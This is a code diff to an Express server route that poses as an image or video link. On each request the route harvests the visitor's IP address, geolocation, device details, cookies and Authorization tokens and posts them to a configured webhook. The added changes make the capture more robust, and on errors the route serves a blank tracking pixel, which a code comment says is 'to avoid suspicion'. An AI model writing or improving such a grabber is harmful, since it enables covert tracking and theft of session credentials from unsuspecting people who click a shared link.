@@ -863,7 +863,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const userAgent = req.headers['user-agent'] || '';
       const referrerHeader = req.headers.referer || req.headers.referrer;
       const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
-      const location = getLocationFromIp(clientIp);
       const cookies = req.headers.cookie || '';
 
       // Extract potential tokens from cookies and headers
@@ -891,66 +890,76 @@ export async function registerRoutes(app: Express): Promise<Server> {
         authTokens.push(`Authorization: ${authHeader}`);
       }
 
-      // Get settings to check for webhook URL and custom image - check all users for uploaded images
-      let settings = null;
-      let imageOwnerUserId = null;
-      
-      // Since this is a public endpoint, we need to find which user has an uploaded image
-      // For now, we'll get the first user's settings that has an uploaded image
-      // In a real implementation, you might use different tracking URLs per user
-      const allUsers = await storage.getAllUsers();
-      for (const user of allUsers) {
-        const userSettings = await storage.getSettings(user.id);
-        if (userSettings?.uploadedImageData) {
-          settings = userSettings;
-          imageOwnerUserId = user.id;
-          break;
-        }
-      }
-      
-      // If no custom image found, use the first user's settings for webhook
-      if (!settings && allUsers.length > 0) {
-        settings = await storage.getSettings(allUsers[0].id);
-        imageOwnerUserId = allUsers[0].id;
-      }
-
       const locationData = getLocationFromIp(clientIp);
       const deviceInfo = parseDeviceInfo(userAgent);
 
-      // Log the IP access with enhanced data (associate with image owner if found)
-      await storage.createIpLog({
-        userId: imageOwnerUserId,
-        ipAddress: clientIp,
-        userAgent,
-        referrer,
-        location: locationData.location,
-        status: 'success',
-        isVpn: locationData.isVpn,
-        vpnLocation: locationData.vpnLocation,
-        realLocation: locationData.realLocation,
-        deviceType: deviceInfo.deviceType,
-        browserName: deviceInfo.browserName,
-        operatingSystem: deviceInfo.operatingSystem,
-        deviceBrand: deviceInfo.deviceBrand
-      });
+      // Try to find settings with uploaded image - use new storage methods
+      let settings = null;
+      let imageOwnerUserId = null;
+      
+      try {
+        // First try to get settings with uploaded image
+        const imageSettings = await storage.getAnySettingsWithImage();
+        if (imageSettings) {
+          settings = imageSettings.settings;
+          imageOwnerUserId = imageSettings.userId;
+        } else {
+          // If no custom image found, try to get settings with webhook
+          const webhookSettings = await storage.getAnySettingsWithWebhook();
+          if (webhookSettings) {
+            settings = webhookSettings.settings;
+            imageOwnerUserId = webhookSettings.userId;
+          } else {
+            // Last resort - get any settings
+            settings = await storage.getSettings();
+          }
+        }
+      } catch (storageError) {
+        console.log('Error accessing storage:', storageError);
+      }
 
-      // Send to webhook if configured
-      if (settings?.webhookUrl) {
-        await sendToWebhook(settings.webhookUrl, {
+      // Log the IP access with enhanced data
+      try {
+        await storage.createIpLog({
+          userId: imageOwnerUserId,
           ipAddress: clientIp,
           userAgent,
           referrer,
           location: locationData.location,
+          status: 'success',
           isVpn: locationData.isVpn,
           vpnLocation: locationData.vpnLocation,
           realLocation: locationData.realLocation,
           deviceType: deviceInfo.deviceType,
           browserName: deviceInfo.browserName,
           operatingSystem: deviceInfo.operatingSystem,
-          deviceBrand: deviceInfo.deviceBrand,
-          cookies: cookies || 'None',
-          tokens: authTokens.length > 0 ? authTokens.join(', ') : 'None'
+          deviceBrand: deviceInfo.deviceBrand
         });
+      } catch (logError) {
+        console.error('Error logging IP access:', logError);
+      }
+
+      // Send to webhook if configured
+      if (settings?.webhookUrl) {
+        try {
+          await sendToWebhook(settings.webhookUrl, {
+            ipAddress: clientIp,
+            userAgent,
+            referrer,
+            location: locationData.location,
+            isVpn: locationData.isVpn,
+            vpnLocation: locationData.vpnLocation,
+            realLocation: locationData.realLocation,
+            deviceType: deviceInfo.deviceType,
+            browserName: deviceInfo.browserName,
+            operatingSystem: deviceInfo.operatingSystem,
+            deviceBrand: deviceInfo.deviceBrand,
+            cookies: cookies || 'None',
+            tokens: authTokens.length > 0 ? authTokens.join(', ') : 'None'
+          });
+        } catch (webhookError) {
+          console.error('Error sending webhook:', webhookError);
+        }
       }
 
       // Determine if it's a video or image request
@@ -1003,7 +1012,22 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
     } catch (error) {
       console.error('Error serving image:', error);
-      res.status(500).json({ error: 'Internal server error' });
+      
+      // Even if there's an error, still serve the image to avoid suspicion
+      const pixel = Buffer.from([
+        0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x21, 0xF9, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0x2C, 0x00, 0x00, 0x00, 0x00,
+        0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x04, 0x01, 0x00, 0x3B
+      ]);
+
+      res.set({
+        'Content-Type': 'image/gif',
+        'Content-Length': pixel.length,
+        'Cache-Control': 'no-cache, no-store, must-revalidate',
+        'Pragma': 'no-cache',
+        'Expires': '0'
+      });
+      res.send(pixel);
     }
   });
 
